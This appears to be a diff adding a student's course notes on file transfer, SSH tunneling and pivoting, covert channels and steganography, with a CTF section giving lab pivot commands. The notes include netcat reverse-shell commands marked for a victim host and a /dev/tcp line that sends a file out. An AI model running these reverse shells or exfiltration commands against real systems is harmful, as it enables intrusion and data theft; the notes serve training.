@@ -1,0 +1,314 @@
+TUNNEL TIP
+> # Two things you need are:
+  > # Loopback
+  > # Port used for the tunnel
+
+
+Common Methods for transfering data
+> FTP
+  > Active (You order Pizza Delivery, they give you the data)
+  > Passive (You order pizza to pickup, you get the data from them)
+> SFTP [SECURE]
+  > TCP Transport (22)
+> SCP
+  > # Uses ssh to transport files
+  > # Symmetric and Asymmetric encryption
+  /> . (present working directory)
+  /> -v (verbose mode)
+  /> -r (recursively copy an entire directory)
+  /> -3 (3 way copy)
+
+  [SCP SYNTAX]
+  /> scp student@172.16.82.106:secretstuf.txt /home/student
+    > # Download file from remote to local
+  /> scp secretstuf.txt student@172m16m82,106:/home/student
+    > # Copy a file from remote to local
+  /> scp -3 student@172.16.82.106:/home/student/secretstuf.txt student@172.16.82.112:/home/student
+    > # 3rd party copying. You are computer c and you are copying stuff from computer a to b
+  /> scp -r folder/ student@172.16.82.106:
+    > # Recursive upload of a folder to remote
+  /> scp -r student@172.16.82.106:folder/ .
+    > # Recursive download of a folder from remote
+
+  [SCP SYNTAX W/ ALTERNATE SSHD]
+  /> scp -P 1111 student@172.16.82.106:secretstuff.txt .
+    > # Download a file from a remote directory to a local directory
+  /> scp -P 1111 secretstuff.txt student@172.16.82.106:
+    > # Upload a file to a remote directory from a local directory
+
+  [SCP SYNTAX THROUGH A TUNNEL]
+  /> ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+    > # Create a locl port forward to target device
+  /> scp -P 1111 student@localhost:secretstuf.txt /home/student
+    > # Download a file from a remote directory to a local directory
+  /> scp -P 1111 secretstuff.txt student@localhost:/home/student
+    > # Upload a fole to a remote directory from a local directory
+
+  [SCP SYNTAX THROUGH A DYNAMIC PORT FORWARD]
+  /> ssh student@172.16.82.106 -D 9050 -NT
+    > # Create a Dynamic port forward to target device
+  /> proxychains scp student@localhost:secretstuff.txt .
+    > # Download a file from a remote directory to a local directory
+  /> proxychains scp secretstuf.txt student@localhost:
+    > # Upload a file to a remote directory from a local directory
+
+
+Conduct Uncommon Methods of File Transfer
+> Netcat (Reads a writes data across network socket connections using TCP/IP protocol)
+  [CLIENT TO LISTENER FILE TRANSFER]
+  /> nc -lvp 9001 > newfile.txt
+    > # Listener (receive file)
+  /> nc 172.16.82.106 9001 < file.txt
+    > # Client (sends file)
+
+  [LISTENER TO CLIENT FILE TRANSFER]
+  /> nc -lvp 9001 < file.txt
+    > # Listener (sends file)
+  /> nc 172.16.82.106 9001 > newfile.txt
+    > # Cleint (recieve file)
+
+  [NETCAT RELAY LISTENER TO LISTENER]
+  /> mknod mypipe p (makes node) or mkfifo mypipe
+    > nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+
+  [EXAMPLE DIAGRAM]
+              nc -lvp 1111 < mypipe | nc -lvp 2222 > mypipe
+  
+          [1]   ----->            [2]             <-----  [3]
+         nc [2] 1111                              nc -lvp 1111
+                                                  (nc [2] 2222)
+
+  [NETCAT RELAY CLIENT TO CLIENT]
+  /> nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
+
+
+  [FILE TRANSFER WITH /DEV/TCP]
+  /> nc -lvp 1111 > devtcpfile.txt
+    > # On the recieving box
+  /> cat secret.txt > /dev/tcp/10.10.0.40/1111
+    > # This method is useful for a host that does not have NETCAT available
+
+Reverse shell using NetCat
+/> nc -lvp 9999
+  > # First listen for the shell on your device
+/> nc -c /bin/bash 10.10.0.40 9999
+  > # On victim using -c
+/> nc -e /bin/bash 10.10.0.40 9999
+  > # On victim using -e
+
+XXD
+/> echo "Hex encoding test" | xxd -p
+/> echo "48657820656e636f64696e6720746573740a" | xxd -r -p
+
+
+
+
+Tunneling Overview
+> Dual Stack
+  > # Both IPv6 and IP4
+> 6in4
+  > # IPv6 encapsulated into IPv4
+> 6to4
+  > # Translates IPv6 to IPv4
+> 4in6
+  > # IPv4 encapsulated in IPv6
+> Teredo
+> ISATRAP
+
+IPv6 over IPv4
+> # Permits ipv6 to be encapsulated in order to move through a ipv4 network
+> # Done by the dual stack router
+> # Payload is not generally encrypted
+> # IPSEC commonly used to secure payloads
+
+Dual Stack
+> # Configures an ipv4 and ipv4 address on all devices
+> # Resource intesive
+> # Allows for ipv4 and ipv6 routing because it has the addresses already set
+> # Can use both but not interchangeably
+
+Teredo Tunneling
+> # Allows ipv4 clients to access ipv6 clients
+> # Encapsulates ipv6 packets within UDP
+> # Commonly used for devices behind the NAT
+
+ISATAP
+> # Allows ipv6 hosts to communicate over an ipv4 network within a site
+> # Can be used over the internet for specific site-to-site
+> # Generates a link-local address using its ipv4 address
+
+
+
+Covert Channels
+> # Using common legitimate protocols to transfer data in illigitimate ways
+> # Unauthorized/hidden communication between entities
+> # Utilizes computer system resources, mechanisms, or protocols
+
+Types of Covert Channels
+> Storage
+  > Payload
+  > Header
+    > # IP Header
+    > # TCP Header
+> Timing
+  > # Modifying transmissino of legitimate traffic
+  > # Watch TTL Changes
+
+
+Detecting covert channels with icmp
+> # ICMP works with one request and one reply answer
+  > # Type 8 code 0 request
+  > # Type 0 code 0 answer
+> Check for:
+  > # Payload imbalance
+  > # Request/responce imbalance
+  > # Large payloads in response
+
+
+
+Detecting covert channels with dns
+> # DNS is a request/response protocol
+> # 1 request typically gets 1 response
+> # Payloads generally do not exceed 512 bytes
+> # Check for:
+  > # Request/response imbalances
+  > # Unusual payloads
+  > # Burstiness or continuous use
+
+
+
+Detecting covert channels with http
+> # Request/Response protocol to pull web content
+> # GET request may include .png, .exe, .(anything) files
+> # Can very in sizes of payloads
+> # Typically "bursty" but not steady
+
+
+
+
+Steganography
+> # Hiding messages inside legitimate information objects
+> Injection
+  > # Done by inserting message into usused (whitespace) of the file, usualy in a graphic
+  > # Second most common method
+  > # Adds size to the file
+  > # Hard to detect unless you have original fil
+  > Tools:
+    > # Steghide
+> Substitution
+  > # Done by inserting message into the insignificant portion of the file
+  > # Most common method used
+  > # Elements within a digital medium are replaced with hidden information
+  > Example:
+    > # Change color pallate
+> Propagation
+  > # Generates a new file entirely
+  > # Needs special software to manupulate file
+  > Tools
+    > # StegSecret
+    > # HyDEn 
+    > # Spammimic
+
+
+
+SSH Key Change FIX
+/> ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
+
+
+
+SSH Port Forwarding
+> # Creates Channels using SSH-CONN Protocol
+> Command Options
+  /> -L (Creates a port on the client mapped to a ip:port via the server)
+  /> -D (Creates a port on the client and sets up a SOCKS4 proxy tunnel where the target ip:port is specified dynamically
+  /> -R Creates the port on the server mapped to a ip:port via the client
+  /> -NT (Do not execute a remote command and disable pseudo-tty (will hang window))
+[LOCAL PORT FORWARDING]
+/> ssh -p <optional alt port> <user>@<server ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
+/> ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip> -NT
+
+[LOCAL PORT FORWARD TO LOCALHOST OF SERVER]
+/> ssh student@172.16.1.15 -L 1122:localhost:22
+/> ssh student@localhost -p 1122
+
+[LOCAL PORT FORWARD TO LOCALHOST OF SERVER]
+/> ssh student@172.16.1.15 -L 1123:localhost:23
+/> telnet localhost 1123
+/> firefox http://localhost:1123
+
+[LOCAL PORT FORWARD TO REMOTE TARGET VIA SERVER]
+/> ssh student@172.16.1.15 -L 2222:172.16.40.10:22
+/> ssh student@localhost -p 2222
+
+[LOCAL PORT FORWARD TO REMOTE TARGET VIA SERVER]
+/> ssh student@172.16.1.15 -L 2223:172.16.40.10:23
+/> telnet localhost 2223
+
+[LOCAL PORT FORWARD TO REMOTE TARGET VIA SERVER]
+/> ssh student@172.16.1.15 -L 2280:172.16.40.10:80
+/> firefox http://localhost:2280
+
+[FORWARD THROUGH TUNNEL]
+/> ssh student@172.16.1.15 -L 2222:172.16.40.10:22
+/> ssh student@localhost -p 2222 -L 3322:172.16.82.106:22
+/> ssh student@localhost -p 3322
+
+[FORWARD THROUGH TUNNEL]
+/> ssh student@172.16.1.15 -L 2222:172.16.40.10:22
+/> telnet localhost 3323
+
+[DYNAMIC PORT FORWARDING]
+/> ssh <user>@<server ip> -p <alt port> -D <port> -NT
+> # Proxychains default port is 9050
+> # Creates a dynamic socks4 proxy that interacts alone, or with a previously established remote or local port forward
+> # Allows the use of scripts and other userspace programs through the tunnel
+
+[SSH DYNAMIC PORT FORWARDING 1-STEP]
+/> sh student@172.16.1.15 -D 9050
+---------------------------------
+proxychains ./scan.sh
+proxychains nmap -Pn 172.16.40.0/27 -p 21-23,80
+proxychains ssh student@172.16.40.10
+proxychains telnet 172.16.40.10
+proxychains wget -r http://172.16.40.10
+proxychains wget -r ftp://172.16.40.10
+---------------------------------
+
+[REMOTE PORT FORWARDING]
+/> ssh -p <optional alt port> <user>@<server ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
+
+[Remote Port Forwarding from localhost of client]
+/> ssh student@10.10.0.40 -R 4422:localhost:22
+
+
+========================================= Tunneling Methodology ======================================
+> # SSH to machine within your reach (1 hop), Lets call it host "A"
+> # Set a Dynamic port of 9050 for proxychains
+  > # 9050 is going to be the same everytime for proxychains
+  > # Can only have one open at a time
+> # Run proxychains command in separate terminal (since you are tunneled to "A" you can run commands on it through the tunnel)
+  > # Begin network recon on the network inside host "A"
+> # Find the device you want to connect to next
+> # Change your first tunnel
+  > # Take out -D 9050 (proxychains ability)
+  > # Put -L <RHP on local machine>:<IP of host "B">:<Port you will use to connect to host "B">
+    > # When you put your local RHP it now loops back to you through the tunnel so you can access host "B"
+> # Once you are connected to host, Open another terminal and type in the command: ssh <user>:localhost -p <alternate port/RHP used in tunnel> -D 9050
+  > # This allows you to perform proxychains on host "B" since you are using the rhp that the tunnel is connected to.
+> # Proceed to perform network recon for the next machine and continue this process.
+
+
+======================== CTF =======================
+T3 (Atropia) Float IP address is - 10.50.20.51
+
+T4 (Pineland) Float IP address is - 10.50.24.9
+
+Entry Float IP: 10.50.24.91
+
+[TUNNEL COMMANDS]
+/> ssh net1_student12@10.50.20.51 -L 11201:localhost:11202 -NT
+  > # This opens a tunnel on Target 3 so Jump Machine can talk on 11201 (also it encapsulates port 11202 into it so both tunnels are combined into 1)
+/> ssh net1_student12@10.3.0.10 -R 11202:localhost:22 -NT
+  > # This opens a tunnel from Target 3 to target 4, since ssh is disabled, telnet into it. Creates port 11202 so it can talk on it. 
+/> ssh net1_student12@localhost -p 11201 -D 9050 -NT
+  > # This adds proxychains to 11201.
